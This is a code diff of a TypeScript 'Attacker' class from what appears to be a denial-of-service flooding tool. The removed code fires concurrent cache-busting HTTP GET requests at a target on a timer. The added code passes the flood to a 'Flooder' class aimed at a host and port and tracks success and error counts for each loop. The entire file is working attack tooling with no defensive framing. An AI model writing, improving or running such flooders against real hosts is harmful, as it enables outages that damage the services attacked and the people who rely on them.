@@ -1,49 +1,28 @@
 import { Stats } from "./stats";
-import request from "request";
+import { Flooder, FlooderEventType } from "./flooder";
 
 export class Attacker {
-    private instance: NodeJS.Timeout;
-    private requests: request.Request[] = [];
+    private flooder: Flooder;
     constructor(private stats: Stats) { }
-    run(target: string, concurrency: number, interval: number) {
+    run(target: string, port: number, concurrency: number, interval: number) {
         this.stop();
         this.stats.target = target;
-        this.instance = setInterval(() => {
-            this.requests.forEach(req => {
-                if(req.response) {
-                    this.stats.success += 1;
-                } else {
-                    this.stats.error += 1;
-                }
-                req.abort();
-            });
-            this.requests.splice(0); // delete all
 
-            for(let i = 0; i < concurrency; i += 1) {
-                this.attack(target, interval);
-            }
+        this.flooder = new Flooder(target, port);
+        this.flooder.on(FlooderEventType.sendSuccess, () => this.stats.success += 1);
+        this.flooder.on(FlooderEventType.sendError, () => this.stats.error += 1);
+        this.flooder.on(FlooderEventType.loop, () => {
             this.stats.loop += 1;
-            console.log(`Target: ${this.stats.target} | Loop: ${this.stats.loop} | Success: ${this.stats.success} | Error: ${this.stats.error}`);
-        }, interval);
+            console.log(`${target}:${port} | loop: ${this.stats.loop} | success: ${this.stats.success} | error: ${this.stats.error}`);
+        });
+        this.flooder.start(concurrency, interval);
     }
 
     stop() {
-        if(this.instance) clearInterval(this.instance);
-        this.stats.reset();
-        this.requests.forEach(req => req.abort());
-    }
-
-    private attack(target: string, timeout: number) {
-        try{
-            const req = request.get({
-                url: target,
-                headers: {
-                    'Cache-Control': 'no-cache'
-                },
-            });
-            this.requests.push(req);
-        } catch(error) {
-            console.error(error);
+        if(this.flooder) {
+            this.flooder.destroy();
+            this.flooder = null;
         }
+        this.stats.reset();
     }
 }
